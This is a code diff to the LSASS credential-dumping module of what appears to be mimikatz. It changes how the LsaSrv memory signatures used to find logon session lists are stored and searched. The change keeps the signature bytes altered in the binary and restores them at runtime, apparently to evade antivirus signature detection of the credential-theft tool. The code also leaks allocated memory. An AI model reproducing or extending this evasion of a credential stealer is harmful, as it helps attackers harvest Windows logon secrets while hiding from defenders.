@@ -52,8 +52,27 @@ PULONG LogonSessionListCount = NULL;
 
 BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)
 {
+	KULL_M_PATCH_GENERIC copy_staticLsaSrv_to_dynamic[ARRAYSIZE(LsaSrvReferences)];
+
+	for (int i = 0;i < ARRAYSIZE(LsaSrvReferences);i++)
+	{
+		KULL_M_PATCH_GENERIC *patch = malloc(sizeof(KULL_M_PATCH_GENERIC));
+		memcpy(&copy_staticLsaSrv_to_dynamic[i], &LsaSrvReferences[i], sizeof(KULL_M_PATCH_GENERIC));
+
+		KULL_M_PATCH_PATTERN *srch = malloc(sizeof(KULL_M_PATCH_PATTERN));
+		memcpy(srch, &LsaSrvReferences[i].Search, sizeof(KULL_M_PATCH_PATTERN));
+
+		BYTE* inc_first_two_bytes = malloc(srch->Length);
+		memcpy(inc_first_two_bytes, srch->Pattern, srch->Length);
+		inc_first_two_bytes[0]++;
+		inc_first_two_bytes[1]++;
+
+		srch->Pattern = inc_first_two_bytes;// currentReference->Search.Pattern;
+		copy_staticLsaSrv_to_dynamic[i].Search = *srch;
+	}
+
 	PVOID *pLogonSessionListCount = (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &LogonSessionListCount);
-	return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  ARRAYSIZE(LsaSrvReferences), (PVOID *) &LogonSessionList, pLogonSessionListCount, NULL, NULL);
+	return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, copy_staticLsaSrv_to_dynamic,  ARRAYSIZE(copy_staticLsaSrv_to_dynamic), (PVOID *) &LogonSessionList, pLogonSessionListCount, NULL, NULL);
 }
 
 
@@ -69,13 +88,7 @@ BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL
 
 	if(currentReference = kull_m_patch_getGenericFromBuild(generics, cbGenerics, cLsass->osContext.BuildNumber))
 	{
-		BYTE * refpattern = currentReference->Search.Pattern;
-		BYTE* inc_first_two_bytes = malloc(strlen(refpattern));
-		memcpy(inc_first_two_bytes, refpattern, strlen(refpattern));
-		inc_first_two_bytes[0]++;
-		inc_first_two_bytes[1]++;
-
-		aLocalMemory.address = inc_first_two_bytes;// currentReference->Search.Pattern;
+		aLocalMemory.address = currentReference->Search.Pattern;
 		if(kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
 		{
 			aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0; // optimize one day
